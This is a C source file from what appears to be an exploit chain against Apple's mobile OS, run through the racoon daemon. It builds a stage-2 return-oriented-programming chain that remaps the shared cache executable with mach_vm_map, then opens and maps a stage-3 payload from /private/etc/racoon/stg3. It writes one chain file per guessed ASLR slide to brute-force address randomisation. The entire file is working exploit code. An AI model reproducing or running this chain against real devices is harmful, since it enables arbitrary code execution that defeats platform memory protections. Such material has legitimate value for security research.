#include "rop.h"
#include "common.h"
#include <sys/mman.h>


void create_stage2(offset_struct_t * offsets) {
	
	int iterations = (offsets->max_slide/offsets->slide_value);
	for (int i = iterations; i >= 0; i--) {
		uint64_t slide = i*offsets->slide_value;
		
		char stage2_file_name[8];
		snprintf((void*)&stage2_file_name,8,"%07d",i);
		uint64_t stage2_file_name_int;
		memcpy(&stage2_file_name_int,&stage2_file_name,8);

		char path[512];
		snprintf(&path,sizeof(path),"/private/etc/racoon/two/%s",stage2_file_name);
		int fd = open(path,O_CREAT,0644);

		rop_gadget_t * curr_gadget = offsets->stage2_ropchain;
		uint64_t buf = 0;
		while (curr_gadget != NULL) {
			switch (curr_gadget->type) {
				case CODEADDR:
					buf = curr_gadget->value + slide;
					write(fd,&buf,8);
					break;
				case STATIC:
					buf = curr_gadget->value;
					write(fd,&buf,8);
					break;
				case OFFSET:
					buf = curr_gadget->value + offsets->stage2_base;
					write(fd,&buf,8);
					break;
				default:
					buf = 0;
					write(fd,&buf,8);
					break;
			}
			curr_gadget = curr_gadget->next;
		}
		close(fd);
	}
}

void stage2(offset_struct_t * offsets) {

	ROP_SETUP(offsets->stage2_ropchain);

#define MEMORY_ENTRY_64_FLAGS (MAP_MEM_VM_SHARE | VM_PROT_IS_MASK | VM_PROT_ALL)
	// longjmp buf
	ADD_STATIC_GADGET(offsets->cache_text_seg_size);	   // 0x00 x19 (arg 2 points here)
	ADD_STATIC_GADGET(MACH_PORT_NULL);					   // 0x08 x20 (arg6/mach_port_null)
	ADD_GADGET();										   // 0x10 x21
	ADD_OFFSET_GADGET(0x110);							   // 0x18 x22 (arg5/handler (this will point to arg6 of the mach_vm_map call))
	ADD_STATIC_GADGET(MEMORY_ENTRY_64_FLAGS);			   // 0x20 x23 (arg4/flags)
	ADD_CODE_GADGET(offsets->cache_text_seg_offset);	   // 0x28 x24 (arg3/cache address)
	ADD_OFFSET_GADGET(0);								   // 0x30 x25 (arg2/pointer to size)
	ADD_STATIC_GADGET(0);								   // 0x38 x26 (arg1/mach_task_self)
	ADD_CODE_GADGET(offsets->mach_vm_memory_entry_64);	   // 0x40 x27 (blr of BEAST_GADGET)
	ADD_GADGET();										   // 0x48 x28 
	ADD_CODE_GADGET(offsets->longjmp);					   // 0x50 x29 (gets overwritten)
	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x58 x30 (next gadget)
	ADD_GADGET();										   // 0x60 x29
	ADD_OFFSET_GADGET(0xb0);							   // 0x68 x2  (new stack)
	ADD_GADGET();										   // 0x70 weird Dx registers
	ADD_GADGET();										   // 0x78 weird Dx registers
	ADD_GADGET();										   // 0x80 weird Dx registers
	ADD_GADGET();										   // 0x88 weird Dx registers
	ADD_GADGET();										   // 0x90 weird Dx registers
	ADD_GADGET();										   // 0x98 weird Dx registers
	ADD_GADGET();										   // 0xa0 weird Dx registers
	ADD_GADGET();										   // 0xa8 weird Dx registers

	
	uint32_t arg8 = VM_PROT_READ | VM_PROT_EXECUTE;
	uint32_t arg9 = arg8;
	ADD_STATIC_GADGET(offsets->new_cache_addr);			   // 0xb0		new stack top  (arg2)
	ADD_GADGET();										   // 0xb8			
	ADD_STATIC_GADGET(arg8 | (((uint64_t)arg9) << 32));				   // 0xc0		d9  (arg 8 and 9) 
	ADD_STATIC_GADGET(VM_INHERIT_NONE);					   // 0xc8		d8  (arg 10)
	ADD_STATIC_GADGET(0x0);								   // 0xd0		x28           
	ADD_CODE_GADGET(offsets->mach_vm_map);				   // 0xd8		x27 call gadget
	ADD_STATIC_GADGET(0x103);							   // 0xe0		x26 x0/first arg (mach_task_self)
	ADD_OFFSET_GADGET(0xb0);							   // 0xe8		x25 x1/second arg (pointer to the address)
	ADD_STATIC_GADGET(offsets->cache_text_seg_size);	   // 0xf0		x24 x2/third arg 
	ADD_STATIC_GADGET(0)								   // 0xf8		x23 x3/fourth arg
	ADD_STATIC_GADGET(VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE);// 0x100		x22 x4/fifth arg
	ADD_STATIC_GADGET(0);								   // 0x108		x21 x6/seventh arg
	ADD_STATIC_GADGET(0);								   // 0x110		x20 x5/sixth arg (this gets overwritten by the previous call)
	ADD_STATIC_GADGET(0);								   // 0x118		x19 x7/eighth arg
	ADD_GADGET();										   // 0x120		x29
	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x128		x30 (next gadget)


	ADD_GADGET();										   // 0x130 new stack top
	ADD_GADGET();										   // 0x138
	ADD_GADGET();										   // 0x140 d9
	ADD_GADGET();										   // 0x148 d8
	ADD_GADGET();										   // 0x150 x28
	ADD_CODE_GADGET(offsets->open);						   // 0x158 x27 call gadget
	ADD_OFFSET_GADGET(0x1b8);							   // 0x160 x26 x0/first arg
	ADD_STATIC_GADGET(O_RDONLY);						   // 0x168 x25 x1/second arg
	ADD_GADGET();										   // 0x170 x24 x2/third arg 
	ADD_GADGET();										   // 0x178 x23 x3/fourth arg
	ADD_GADGET();										   // 0x180 x22 x4/fifth arg
	ADD_GADGET();										   // 0x188 x21 x6/seventh arg
	ADD_GADGET();										   // 0x190 x20 x5/sixth arg
	ADD_GADGET();										   // 0x198 x19 x7/eighth arg
	ADD_GADGET();										   // 0x1a0 x29
	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x1a8 x30 (next gadget)

#define STAGE3_FD 7

	ADD_GADGET();							   			   // 0x1b0 new stack top
	ADD_STATIC_GADGET(0x657461766972702f);	   			   // 0x1b8     (/private)
	ADD_STATIC_GADGET(0x6361722f6374652f);	   			   // 0x1c0 d9  (/etc/rac) 
	ADD_STATIC_GADGET(0x336774732f6e6f6f);	   			   // 0x1c8 d8  (oon/stg3)
	ADD_STATIC_GADGET(0x0);					   			   // 0x1d0 x28
	ADD_CODE_GADGET(offsets->mmap);			   			   // 0x1d8 x27 call gadget
	ADD_STATIC_GADGET(offsets->stage3_base);   			   // 0x1e0 x26 x0/first arg
	ADD_STATIC_GADGET(offsets->stage3_size);   			   // 0x1e8 x25 x1/second arg
	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); 			   // 0x1f0 x24 x2/third arg 
	ADD_STATIC_GADGET(MAP_FIXED | MAP_PRIVATE) 			   // 0x1f8 x23 x3/fourth arg
	ADD_STATIC_GADGET(STAGE3_FD);			   			   // 0x200 x22 x4/fifth arg
	ADD_GADGET();							   			   // 0x208 x21 x6/seventh arg
	ADD_STATIC_GADGET(0);					   			   // 0x210 x20 x5/sixth arg
	ADD_GADGET();							   			   // 0x218 x19 x7/eighth arg
	ADD_GADGET();							   			   // 0x220 x29
	ADD_CODE_GADGET(offsets->longjmp);	    			   // 0x228 x30 (next gadget)

	
	create_stage2(offsets);
}
